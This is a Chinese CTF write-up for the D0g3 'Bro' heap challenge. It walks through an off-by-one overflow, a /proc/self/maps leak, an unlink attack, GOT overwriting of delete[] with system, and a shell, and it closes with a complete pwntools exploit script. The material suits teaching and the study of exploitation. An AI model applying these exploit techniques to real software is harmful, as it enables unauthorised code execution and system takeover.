# D0g3-19-Bro

## 来源
D0g3 - 19 - 月赛


## 难度

4 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

这是一个相对比较简单的堆利用题, 但是与平常做的有点不同,因为这个不是c语言写的, 采用new和delete方式进行内存开辟和释放,但是原理都一样.题目相对简单,没有特别奥脑的利用.

## vul

```c
unsigned __int64 modify(void) //修改函数
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  int v5; // [rsp+Ch] [rbp-14h]
  unsigned __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "What index it is?");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &v5);
  if ( v5 >= 0 && v5 <= 9 )
  {
    if ( plist[2 * v5] && plist[2 * v5 + 1] )
    {
      v2 = std::operator<<<std::char_traits<char>>(&std::cout, "What you wanna say?");
      std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
      for ( i = 0LL; i <= plist[2 * v5 + 1]; ++i ) //存在off by one 漏洞
        read(0, (void *)(plist[2 * v5] + i), 1uLL);
      v3 = std::operator<<<std::char_traits<char>>(&std::cout, "OK!");
      std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    }
    else
    {
      v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Oh poor guy!");
      std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
    }
  }
  return __readfsqword(0x28u) ^ v7;
}
```

 存在的漏洞有两个. 一个是off by one, 还有一个是除了含有'l'的文件名称不能打开之外,其他文件都能打开且可以打印出文件中的内容, 

## 知识点

unlink利用, linux常见内存文件.

参考: https://wiki.x10sec.org/pwn/heap/unlink/

## 思路

通过打开/proc/self/maps文件然后打印出elf的基址.然后由于字符有限, 没有打印出libc基址,后面需要采用打印got表方式获取.计算获取plist的地址, 使用unlink 打入plist,修改里面的内容为 libc中的read函数的got还有c++中的delete的got(后面来getshell), 注意这个delete[]为 _ZdaPv.打印read的got表计算libc的基址, 获取system, 然后在改delete[]的got表为system, 增加一个堆块,放入'/bin/sh',然后delete掉该堆块获取shell.

## 利用

### exp准备

```python
from pwn import *
# author : i0gan
# team   : D0g3
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "/lib/x86_64-linux-gnu/libc-2.23.so"
#libFile  = "./libc.so.6"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size):
	sla('>>', str(1))
	sla('?', str(size))

def rm(idx):
	sla('>>', str(2))
	sla('?', str(idx))	

def md(idx, text):
	sla('>>', str(3))	
	sla('?', str(idx))	
	sa('?', text)	

def op(fileName):
	sla('>>', str(4))
	sla('?', str(fileName))
	
def dp(opt, idx):
	sla('>>', str(5))
	sla('text', str(opt))	
	if(opt == 1):
		sla('What index it is?', str(idx))	


def q():
	sla(':', str(6))	

```



### 获取elf基址

```python
#open file then get elf base
	op('/proc/self/maps')
	dp(2, 0)
	rl()
	rl()
	exe_base = int(r(12), 16)

	rl()
	rl()
	rl()
	rl()
	bss_base = int(r(12), 16)
	list_addr = bss_base + 0x140
	li('exe_base ' + hex(exe_base))   #elf基址
	li('list_addr ' + hex(list_addr)) # 这个是plist的地址
```

打印结果如下, 可以看到没有libc基址

```
'your text:\n'
    '563d04bfe000-563d04bff000 r--p 00000000 00:2c 1561                       /home/pwn/share/pwn\n'
    '563d04bff000-563d04c01000 r-xp 00001000 00:2c 1561                       /home/pwn/share/pwn\n'
    '563d04c01000-563d04c02000 r--p 00003000 00:2c 1561                       /home/pwn/share/pwn\n'
    '563d04c02000-563d04c03000 r--p 00003000 00:2c 1561                       /home/pwn/share/pwn\n'
    '563d04c03000-563d04c04000 rw-p 00004000 00:2c 1561                       /home/pwn/share/pwn\n'
    '563d05312000-563d05344000 rw-p 00000000 00:00 0                          [heap]\n'
    '7f0afd2e8000-7f0afd2fe000 r-xp 00000000 fc:00 131343                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n'
    '7f0afd2fe000-7f0afd4fd000 ---p 00016000 fc:00 131343                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n'
    '7f0afd4fd000-7f0afd4fe000 rw-p 00015000 fc:00 131343                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n'
    '7f0afd4fe000-7f0afd606000 r-xp 00000000 fc:00 131358                     /lib/x86_64-linux-gnu/libm-2.23.so\n'
    '7f0afd606000-7f0afd805000 ---p 00108000 fc:01. add\n'

```

那么我们就可以知道了plist的地址了,就可以使用unlink打入plist处

### 构造unlink

```python
	ad(0x80) #留一个地址储存在plist中, 其实不用留也可以
    
	#unlink attack
	ad(0x58)
	ad(0x80)
    # 构造fake chunk实现unlink
	p = p64(0) #prev_size
	p += p64(0x50) #size
    #绕过unlink检查,也实现我们的目的
	p += p64(list_addr + 0x10 - 0x18); #p->fd->bk = p
	p += p64(list_addr + 0x10 - 0x10);#p->bk->fd = p
	p += p64(0x50) #next chun prev_size
	p = p.ljust(0x50, '\x00')
	p += p64(0x50) # 前一个chunk的大小
	p += '\x90' #off by one 漏洞,修改下一个chunk的低位为0,标志上一个chunk没有在使用
	md(1, p) 
	rm(2) #下一个chunk 实现unlink
```

### 修改plist中的数据

```python
#modify plist
	delete_got = exe_base + 0x5098 #这个是delete[]的got表地址
	read_got   = exe_base + exe.got['read'] #read 的got地址
	p = p64(0)
	p += p64(read_got)
	p += p64(0x8)
	p += p64(list_addr - 0x8) #这里要保持和原来的数据一样,不然会在写入的时候就写到其他地方去了
	p += p64(0x58) #大小其实无所谓, 只要够这个payload就行了
	p += p64(delete_got) #delete[]的got地址, 后期用于修改为system
	p += p64(0x8)
	p = p.ljust(0x59, '\x00')
	md(1, p)
```

### 获取system地址

```python
#get system addr
	dp(1, 0) #打印出read在libc中的地址
	read_addr = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') #获取read在libc中的地址
	libc_base = read_addr - lib.sym['read']
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	li('sys_addr ' + hex(sys_addr))
    #修改delete[]的got表为 system
	p = p64(sys_addr) + '\x00'
	md(2, p)
```

### getshell

```python
#get shell
	ad(0x10) #添加一个堆来存放'/bin/sh'字符串
	p = '/bin/sh'
	p = p.ljust(0x11, '\x00')
	md(3, p)
	rm(3) #是否掉该堆就调用 system('/bin/sh')
```


## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "/lib/x86_64-linux-gnu/libc-2.23.so"
#libFile  = "./libc.so.6"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size):
	sla('>>', str(1))
	sla('?', str(size))

def rm(idx):
	sla('>>', str(2))
	sla('?', str(idx))	

def md(idx, text):
	sla('>>', str(3))	
	sla('?', str(idx))	
	sa('?', text)	

def op(fileName):
	sla('>>', str(4))
	sla('?', str(fileName))
	
def dp(opt, idx):
	sla('>>', str(5))
	sla('text', str(opt))	
	if(opt == 1):
		sla('What index it is?', str(idx))	


def q():
	sla(':', str(6))	

#--------------------------Exploit--------------------------
def exploit():
	#open file then get elf base
	op('/proc/self/maps')
	dp(2, 0)

	rl()
	rl()
	exe_base = int(r(12), 16)

	rl()
	rl()
	rl()
	rl()
	bss_base = int(r(12), 16)
	list_addr = bss_base + 0x140

	li('exe_base ' + hex(exe_base))
	li('list_addr ' + hex(list_addr))

	ad(0x80) #for move ptr in 1

	#unlink attack
	ad(0x58)
	ad(0x80)
	p = p64(0)
	p += p64(0x50)
	p += p64(list_addr + 0x10 - 0x18); #p->fd->bk = p
	p += p64(list_addr + 0x10 - 0x10);#p->bk->fd = p
	p += p64(0x50) #next chun prev_size
	p = p.ljust(0x50, '\x00')
	p += p64(0x50)
	p += '\x90'
	md(1, p)
	rm(2)

	#modify plist
	delete_got = exe_base + 0x5098 #Z...
	read_got   = exe_base + exe.got['read']
	p = p64(0)
	p += p64(read_got)
	p += p64(0x8)
	p += p64(list_addr - 0x8) #keep
	p += p64(0x58) #keep
	p += p64(delete_got)
	p += p64(0x8)
	p = p.ljust(0x59, '\x00')
	md(1, p)

	#get system addr
	dp(1, 0) #puts read got
	read_addr = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base = read_addr - lib.sym['read']
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	li('sys_addr ' + hex(sys_addr))
	p = p64(sys_addr) + '\x00'
	md(2, p)

	#get shell
	ad(0x10)
	p = '/bin/sh'
	p = p.ljust(0x11, '\x00')
	md(3, p)
	rm(3) #exec sys

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
```